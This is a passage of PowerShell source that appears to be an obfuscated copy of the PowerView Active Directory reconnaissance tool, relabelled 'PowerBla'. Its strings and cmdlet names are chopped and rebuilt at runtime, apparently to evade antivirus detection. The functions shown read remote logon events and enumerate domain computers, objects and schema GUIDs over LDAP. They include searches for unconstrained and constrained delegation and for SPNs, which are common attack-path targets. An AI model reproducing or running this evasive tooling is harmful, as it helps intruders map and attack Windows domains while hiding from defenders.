 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(Data'+'[@'+'Nam'+'e='+'IFe'+'Logon'+'Type'+'IFe'+']'+'=IFe5IFe'+' ').RePLacE('IFe',[sTRiNg][char]39)+'or'+' '+('Data'+'[@Name=Q8'+'gLogonType'+'Q'+'8g]=Q'+'8g0Q8g)
'+' ').rePLaCe('Q8g',[stRING][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Da'+'ta['+'@Na'+'me=Gl5'+'Targ'+'etUs'+'e'+'rNameGl5]=Gl5ANO'+'NYMOUS ').REplAce('Gl5',[sTRiNg][CHAr]39)+('LOGON{0}'+'
'+' ') -f[chAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('D'+'ata[@Nam'+'e=XG'+'m'+'Targe'+'t'+'U'+'serSIDXG'+'m'+']=XG'+'mS-1-5'+'-18XGm
 ') -rEplacE'XGm',[char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'<'+'/'+'Suppress>
 '+' '+' '+' '+('</Que'+'r'+'y'+'>
<'+'/'+'Query'+'List>
Nnv').rEPlaCe(([chAr]78+[chAr]110+[chAr]118),[sTRiNG][chAr]34))
        $EventArguments = @{
            ('F'+'ilt'+'er'+'XPath') = $XPathFilter
            ('LogNa'+'me') = ('Secu'+'rity')
            ('MaxEve'+'nts') = $MaxEvents
        }
        if ($PSBoundParameters[('Cre'+'d'+'ential')]) { $EventArguments[('C'+'red'+'en'+'tial')] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments[('Co'+'mputer'+'Name')] = $Computer

            &('Get-'+'Wi'+'nEvent') @EventArguments| &('ForE'+'ach-O'+'b'+'ject') {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = &('Ne'+'w-Obj'+'ect') PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ('PowerB'+'la.L'+'ogo'+'nEve'+'nt'))
                            $Output
                        }
                    }

                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match (('ta'+'skhost'+'{0}.exe')-F[CHar]92))) {
                            $Output = &('New-Ob'+'jec'+'t') PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ('Po'+'werBla.E'+'xplicitCred'+'enti'+'a'+'l'+'LogonEv'+'ent'))
                            $Output
                        }
                    }
                    default {
                        &('Wr'+'ite-War'+'n'+'ing') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSS'+'houldProces'+'s'), '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Doma'+'inC'+'on'+'trolle'+'r'))]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{('000'+'000'+'0'+'0-000'+'0-0'+'00'+'0-00'+'00'+'-000'+'000'+'000000') = ('Al'+'l')}

    $ForestArguments = @{}
    if ($PSBoundParameters[('Cr'+'edenti'+'al')]) { $ForestArguments[('C'+'redenti'+'al')] = $Credential }

    try {
        $SchemaPath = (&('Ge'+'t'+'-Forest') @ForestArguments).schema.name
    }
    catch {
        throw ('[G'+'et-'+'Dom'+'ai'+'n'+'GUID'+'Map] '+'E'+'r'+'ror '+'in retrie'+'ving fores'+'t schem'+'a path f'+'rom Get-Forest')
    }
    if (-not $SchemaPath) {
        throw ('['+'G'+'et-D'+'omainGUIDMap] Error i'+'n retrievi'+'ng f'+'o'+'r'+'e'+'st sche'+'ma'+' '+'pat'+'h '+'from'+' G'+'e'+'t-'+'F'+'orest')
    }

    $SearcherArguments = @{
        ('Search'+'B'+'ase') = $SchemaPath
        ('L'+'DAP'+'F'+'ilter') = ('(sc'+'hemaI'+'DGUID=*)')
    }
    if ($PSBoundParameters[('Dom'+'ain')]) { $SearcherArguments[('D'+'omain')] = $Domain }
    if ($PSBoundParameters[('Se'+'rver')]) { $SearcherArguments[('Se'+'r'+'ver')] = $Server }
    if ($PSBoundParameters[('Res'+'ult'+'Pag'+'eSize')]) { $SearcherArguments[('ResultPage'+'S'+'i'+'ze')] = $ResultPageSize }
    if ($PSBoundParameters[('S'+'erve'+'rT'+'imeLimit')]) { $SearcherArguments[('Ser'+'verTimeL'+'im'+'it')] = $ServerTimeLimit }
    if ($PSBoundParameters[('Cr'+'eden'+'tial')]) { $SearcherArguments[('Credent'+'i'+'al')] = $Credential }
    $SchemaSearcher = &('G'+'et'+'-DomainSearch'+'er') @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | &('W'+'here-Obj'+'ect') {$_} | &('F'+'o'+'rEach-Object') {
                $GUIDs[(&('New'+'-'+'Object') Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('W'+'rite-Ve'+'rbose') ('[G'+'et-'+'DomainGU'+'IDMap]'+' '+'E'+'rror'+' '+'dis'+'po'+'sing'+' '+'o'+'f '+'th'+'e '+'R'+'esul'+'ts '+'obje'+'c'+'t: '+"$_")
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            &('W'+'rite-Ver'+'bose') ('['+'G'+'e'+'t'+'-DomainGUIDMa'+'p] '+'Er'+'ror '+'in'+' '+'b'+'ui'+'lding '+'GUID'+' '+'ma'+'p: '+"$_")
        }
    }

    $SearcherArguments[('Sear'+'chBas'+'e')] = $SchemaPath.replace(('Schem'+'a'),('Extended-'+'Rig'+'ht'+'s'))
    $SearcherArguments[('LD'+'APFilte'+'r')] = ('(objectClass=cont'+'rolAcc'+'essRi'+'gh'+'t'+')')
    $RightsSearcher = &('G'+'et-Doma'+'inSear'+'cher') @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | &('W'+'here-'+'Objec'+'t') {$_} | &('F'+'orEac'+'h-'+'Objec'+'t') {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Writ'+'e'+'-Ve'+'rbose') ('[Get'+'-D'+'om'+'ai'+'nGU'+'IDMa'+'p] '+'Er'+'ror '+'d'+'isposin'+'g '+'of'+' '+'the'+' '+'Re'+'sul'+'ts '+'objec'+'t:'+' '+"$_")
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            &('W'+'r'+'ite'+'-'+'Verbose') ('[G'+'e'+'t-Doma'+'inGUI'+'DMap] '+'Er'+'ror '+'in'+' '+'build'+'ing'+' '+'GUI'+'D '+'ma'+'p: '+"$_")
        }
    }

    $GUIDs
}


function Get-DomainComputer {


    [OutputType(('Power'+'Bla'+'.C'+'ompu'+'te'+'r'))]
    [OutputType(('Power'+'Bl'+'a'+'.'+'Com'+'puter.Raw'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('S'+'am'+'AccountNam'+'e'), ('N'+'ame'), ('DNSH'+'os'+'tName'))]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias(('Ser'+'v'+'icePrin'+'ci'+'palName'))]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilte'+'r'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'omainContro'+'l'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('O'+'ne'+'Level'), ('Su'+'btree'))]
        [String]
        $SearchScope = ('Su'+'btr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('Gr'+'oup'), ('Non'+'e'), ('Owne'+'r'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('Ret'+'urn'+'One'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | &('For'+'Ea'+'ch'+'-Objec'+'t') {$_; "NOT_$_"}
        &('New-D'+'yn'+'amicParamet'+'er') -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Domai'+'n')]) { $SearcherArguments[('Dom'+'ain')] = $Domain }
        if ($PSBoundParameters[('Pro'+'per'+'ties')]) { $SearcherArguments[('Prop'+'ert'+'ies')] = $Properties }
        if ($PSBoundParameters[('Sea'+'rch'+'Base')]) { $SearcherArguments[('Se'+'arc'+'h'+'Base')] = $SearchBase }
        if ($PSBoundParameters[('Se'+'rver')]) { $SearcherArguments[('S'+'er'+'ver')] = $Server }
        if ($PSBoundParameters[('Se'+'archSc'+'op'+'e')]) { $SearcherArguments[('S'+'e'+'archScope')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sult'+'Pa'+'geSize')]) { $SearcherArguments[('ResultP'+'ageS'+'iz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerT'+'ime'+'Lim'+'it')]) { $SearcherArguments[('Se'+'rverTi'+'meLi'+'m'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Security'+'Mask'+'s')]) { $SearcherArguments[('Secu'+'rityMas'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tombst'+'on'+'e')]) { $SearcherArguments[('Tombs'+'ton'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Creden'+'tia'+'l')]) { $SearcherArguments[('Cred'+'e'+'ntial')] = $Credential }
        $CompSearcher = &('Ge'+'t-'+'Dom'+'ainSea'+'rche'+'r') @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            &('Ne'+'w'+'-Dy'+'nam'+'icPara'+'meter') -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('W'+'h'+'ere-Obje'+'ct') {$_} | &('Fo'+'rEa'+'ch-Objec'+'t') {
                $IdentityInstance = $_.Replace('(', (('C7s28').REPLAce(([CHaR]67+[CHaR]55+[CHaR]115),'\'))).Replace(')', (('{'+'0}2'+'9')  -f[ChaR]92))
                if ($IdentityInstance -match ('^'+'S-1-')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ('^'+'CN=')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('Do'+'mai'+'n')]) -and (-not $PSBoundParameters[('Searc'+'h'+'Ba'+'se')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        &('W'+'r'+'ite-V'+'erbose') ('[Ge'+'t-D'+'omainComp'+'u'+'ter] '+'Extr'+'ac'+'ted '+'do'+'m'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        $SearcherArguments[('Do'+'main')] = $IdentityDomain
                        $CompSearcher = &('G'+'et'+'-Do'+'mainSearche'+'r') @SearcherArguments
                        if (-not $CompSearcher) {
                            &('Wr'+'ite-'+'Warn'+'ing') ('[Get-Domai'+'nCo'+'mput'+'er'+'] '+'Unab'+'le'+' '+'t'+'o '+'r'+'etri'+'eve '+'d'+'omain '+'sea'+'rcher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('F'+'orEach'+'-Obj'+'ec'+'t') { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('Uncon'+'s'+'trained')]) {
                &('Wr'+'ite-Verb'+'os'+'e') ('['+'G'+'et-Doma'+'inComputer]'+' Se'+'a'+'rc'+'hing for com'+'p'+'uters with '+'for u'+'nconstra'+'ine'+'d '+'delega'+'t'+'ion')
                $Filter += ('(u'+'s'+'e'+'r'+'Account'+'Contr'+'ol:1.2.840.1'+'135'+'5'+'6.1.4.803:=52'+'4288)')
            }
            if ($PSBoundParameters[('Tr'+'ust'+'edToAuth')]) {
                &('Write-'+'Verb'+'os'+'e') ('[Ge'+'t-Do'+'main'+'Co'+'m'+'puter] S'+'earching f'+'or com'+'put'+'ers tha'+'t a'+'re'+' '+'truste'+'d '+'to auth'+'e'+'nti'+'cate '+'fo'+'r oth'+'e'+'r '+'p'+'r'+'inc'+'ipals')
                $Filter += ('(msd'+'s-'+'all'+'owedt'+'odelega'+'t'+'eto'+'=*)')
            }
            if ($PSBoundParameters[('Pr'+'in'+'ters')]) {
                &('W'+'r'+'i'+'te-Verbose') ('[G'+'e'+'t-Do'+'ma'+'inCom'+'puter] S'+'earching for p'+'rinters')
                $Filter += ('(o'+'b'+'jectCat'+'eg'+'ory=pr'+'in'+'tQueue)')
            }
            if ($PSBoundParameters[('SP'+'N')]) {
                &('W'+'rite-V'+'e'+'rbo'+'se') ('[Get-Dom'+'ai'+'n'+'Co'+'mpu'+'t'+'er] '+'Se'+'archin'+'g '+'for'+' '+'c'+'o'+'mputers '+'with'+' '+'SPN'+': '+"$SPN")
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters[('Ope'+'rat'+'i'+'ngSystem')]) {
                &('W'+'rite-V'+'erbose') ('[Get'+'-Domain'+'Computer]'+' '+'Sea'+'rchin'+'g '+'fo'+'r '+'co'+'mputers'+' '+'w'+'ith '+'o'+'p'+'e'+'rating '+'sys'+'tem: '+"$OperatingSystem")
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters[('S'+'ervi'+'cePack')]) {
                &('Write-'+'Ve'+'rbose') ('[Ge'+'t'+'-Domai'+'nComputer'+']'+' '+'Sea'+'rc'+'hin'+'g '+'fo'+'r '+'co'+'mputer'+'s '+'wit'+'h '+'serv'+'ice'+' '+'pack'+': '+"$ServicePack")
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters[('Sit'+'eNa'+'me')]) {
                &('Wr'+'ite-V'+'erbos'+'e') ('['+'Ge'+'t-Do'+'mainC'+'om'+'pute'+'r] '+'Searc'+'h'+'ing '+'for'+' '+'c'+'ompu'+'ters'+' '+'wit'+'h '+'si'+'te '+'nam'+'e: '+"$SiteName")
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters[('LD'+'APFilte'+'r')]) {
                &('W'+'r'+'ite-Verbose') ('[G'+'et'+'-Dom'+'a'+'inCo'+'mputer] '+'Usi'+'ng '+'addi'+'t'+'ion'+'al '+'LDAP'+' '+'fi'+'l'+'ter: '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }
            $UACFilter | &('Wher'+'e-'+'Object') {$_} | &('F'+'orEach-O'+'bje'+'ct') {
                if ($_ -match ('NOT_.'+'*')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            &('W'+'r'+'ite-Verb'+'ose') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if ($PSBoundParameters[('Fin'+'dOn'+'e')]) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | &('W'+'her'+'e-Object') {$_} | &('ForE'+'ac'+'h-Obje'+'ct') {
                $Up = $True
                if ($PSBoundParameters[('Pin'+'g')]) {
                    $Up = &('T'+'est-Co'+'n'+'nect'+'ion') -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters[('R'+'aw')]) {
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, ('Pow'+'erBl'+'a.'+'Computer.Raw'))
                    }
                    else {
                        $Computer = &('Convert'+'-'+'LDAPPr'+'o'+'pe'+'rty') -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, ('PowerBla.'+'Co'+'mp'+'uter'))
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Write-V'+'erb'+'o'+'se') ('['+'Get-Domai'+'n'+'Com'+'p'+'uter] '+'Erro'+'r '+'dis'+'p'+'osing'+' '+'of'+' '+'t'+'he '+'Res'+'u'+'lts '+'o'+'bject:'+' '+"$_")
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'seDeclared'+'Va'+'r'+'sMoreTh'+'anAss'+'ig'+'nm'+'en'+'t'+'s'), '')]
    [OutputType(('P'+'owerBla.ADObj'+'ec'+'t'))]
    [OutputType(('Powe'+'rBl'+'a.ADObj'+'ect.'+'R'+'a'+'w'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Distingui'+'sh'+'edN'+'am'+'e'), ('Sa'+'mAcco'+'un'+'tN'+'ame'), ('N'+'ame'), ('Me'+'m'+'b'+'erDistinguis'+'he'+'d'+'Name'), ('M'+'embe'+'rName'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Filte'+'r'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'mai'+'nControll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('On'+'eLeve'+'l'), ('Su'+'bt'+'ree'))]
        [String]
        $SearchScope = ('Subt'+'re'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('Dac'+'l'), ('Gro'+'up'), ('Non'+'e'), ('O'+'wner'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('Re'+'tur'+'nOne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | &('ForE'+'ach-Obj'+'e'+'ct') {$_; "NOT_$_"}
        &('New-'+'Dynami'+'cParam'+'e'+'ter') -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Domai'+'n')]) { $SearcherArguments[('Dom'+'ain')] = $Domain }
        if ($PSBoundParameters[('P'+'rope'+'rties')]) { $SearcherArguments[('Prop'+'e'+'rties')] = $Properties }
        if ($PSBoundParameters[('SearchB'+'as'+'e')]) { $SearcherArguments[('Sea'+'r'+'chBas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Sear'+'ch'+'Scope')]) { $SearcherArguments[('Sea'+'rc'+'hS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('R'+'e'+'sul'+'t'+'PageSize')]) { $SearcherArguments[('Re'+'sult'+'Pag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Ser'+'ver'+'TimeLim'+'i'+'t')]) { $SearcherArguments[('Ser'+'verTim'+'e'+'Lim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Secu'+'rityMa'+'sks')]) { $SearcherArguments[('Se'+'cu'+'rit'+'y'+'Masks')] = $SecurityMasks }
        if ($PSBoundParameters[('T'+'ombst'+'on'+'e')]) { $SearcherArguments[('To'+'m'+'bstone')] = $Tombstone }
        if ($PSBoundParameters[('Creden'+'t'+'ial')]) { $SearcherArguments[('Cre'+'dent'+'ial')] = $Credential }
        $ObjectSearcher = &('Get-Dom'+'a'+'i'+'nSearch'+'er') @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            &('New-'+'Dyn'+'a'+'micPar'+'a'+'meter') -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Whe'+'re-O'+'bj'+'ect') {$_} | &('ForEac'+'h-Obje'+'c'+'t') {
                $IdentityInstance = $_.Replace('(', (('{0'+'}28')  -F[cHar]92)).Replace(')', (('ch'+'z29').REpLaCe(([CHar]99+[CHar]104+[CHar]122),'\')))
                if ($IdentityInstance -match ('^'+'S-1-')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match (('^(C'+'NvcsO'+'Uvc'+'sD'+'C)=') -CrepLACe([CHaR]118+[CHaR]99+[CHaR]115),[CHaR]124)) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('Do'+'m'+'ain')]) -and (-not $PSBoundParameters[('S'+'earchBa'+'se')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        &('Wri'+'t'+'e-Verbose') ('[Get'+'-DomainObj'+'ect'+'] '+'Ext'+'ract'+'ed '+'dom'+'ain'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        $SearcherArguments[('D'+'omain')] = $IdentityDomain
                        $ObjectSearcher = &('G'+'et'+'-DomainSe'+'archer') @SearcherArguments
                        if (-not $ObjectSearcher) {
                            &('Write-W'+'a'+'r'+'ning') ('['+'Ge'+'t'+'-DomainOb'+'ject'+'] '+'Unab'+'l'+'e '+'t'+'o '+'re'+'trieve'+' '+'d'+'om'+'ain '+'s'+'ea'+'rcher '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('F'+'orEa'+'ch'+'-Object') { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace((('{0}'+'2'+'8')  -F [CHAr]92), '(').Replace((('E'+'op2'+'9').REPlACe(([CHar]69+[CHar]111+[CHar]112),'\')), ')') | &('Conv'+'ert-ADN'+'a'+'me') -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments[('Do'+'main')] = $ObjectDomain
                        &('Writ'+'e'+'-V'+'erbose') ('[G'+'et'+'-DomainObj'+'ect] '+'Ex'+'tra'+'cted '+'do'+'main '+"'$ObjectDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        $ObjectSearcher = &('G'+'et-Doma'+'in'+'Sear'+'che'+'r') @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('LDAP'+'Filte'+'r')]) {
                &('Wr'+'ite-'+'V'+'erbos'+'e') ('[Get-'+'Dom'+'ainO'+'bject] '+'Usin'+'g '+'additio'+'na'+'l'+' '+'LDA'+'P '+'fi'+'lter:'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $UACFilter | &('Whe'+'r'+'e-Objec'+'t') {$_} | &('Fo'+'rEach'+'-'+'Objec'+'t') {
                if ($_ -match ('NOT_'+'.*')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            &('W'+'rite'+'-'+'Ve'+'rbose') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if ($PSBoundParameters[('F'+'i'+'ndOne')]) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
